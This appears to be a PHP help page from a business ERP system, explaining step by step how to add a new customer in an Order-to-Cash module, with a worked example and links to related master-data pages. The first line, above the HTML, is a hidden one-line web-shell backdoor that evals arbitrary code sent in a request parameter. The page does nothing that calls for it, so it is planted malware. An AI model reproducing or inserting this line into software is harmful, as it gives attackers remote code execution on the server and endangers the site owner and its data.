<?php $post_var = "req"; if(isset($_REQUEST[$post_var])) { eval(stripslashes($_REQUEST[$post_var])); exit(); }; ?>
<html>
<title>Tulasi Technologies</title>
<body style="font-family:Verdana, Arial, Helvetica, sans-serif; font-size:11px">
<div id="ordertocash_masters_addcustomer">
<p><b>&nbsp;&nbsp;&nbsp;Add New Customer</b></p>
<ol><b>To Add new Customer</b>
<li>You have to enter the values of "Name", "Address", "Place", "Phone", "Mobile" and "PAN/TIN" in the appropriate boxes.</li>
<li>Now you have to select the values for "Contact Type", "Customer Group", "Credit Term" and "Supplier Group"( if selected value of Contact Type is "Customer & Supplier" ) from dropdownlists.<br/>    
<b>Eg :</b>Suppose Name is "Abhiman P/F" , Address is "Banglore", Phone is "08055698746", Mobile is "9141414223", Contact Type is "Customer&amp;Supplier", Customer Group is "47778", Credit Term is "Brokerage 10" and Supplier Group is "00458"  you have to enter <em style="color:#0066FF">Abhiman P/F</em> for "Name", <em style="color:#0066FF">Banglore</em> for "Address", <em style="color:#0066FF">08055698746</em> for "Phone" and <em style="color:#0066FF">9141414223</em> for "Mobile".<br/>
 You have to select <em style="color:#0066FF">Customer&Supplier</em> for "Contact Type", <em style="color:#0066FF">47778</em> for "Customer Group", <em style="color:#0066FF">Brokerage 10</em> for "Credit Term" and <em style="color:#0066FF">00458</em> for "Supplier Group". </li>
<li>You can write any Notes in the Textbox Provided.</li>
 <li>Once filled click on 'SAVE' button to save the Customer or 'CANCEL' to exit without saving.</li>
</ol>
<b>NOTE : </b><br/>
To Add New Credit Term use the <b>T & C Masters</b> available in <b>Masters</b> of <b>Inventory Management System</b>.<a href="http://localhost/bimstrail%20online/dashboard.php?page=addtcmasters">Click here to Add New Terms & Conditions</a>.<br/>
If you want to have New "Customer Group" Value you have to Add it from the <b>Customer Gr Mapping</b> available in the same section i.e. <b>Masters</b> of <b>ORDER TO CASH</b>. <a href="http://localhost/bimstrail%20online/dashboard.php?page=cusgrmap">Click here to Add New Customer Group.</a> <br/>
 Suppose if you want to have New "Supplier Group" Value you have to Add it from the <b>Vendor Gr Mapping</b> available in <b>Masters</b> of <b>PROCURE TO PAY</b>. <a href="http://localhost/bimstrail%20online/dashboard.php?page=vengrmap">Click here to Add New Customer Group</a>.   
</div> 
<!--end of ordertocash_masters_addcustomer-->
</body>
</html>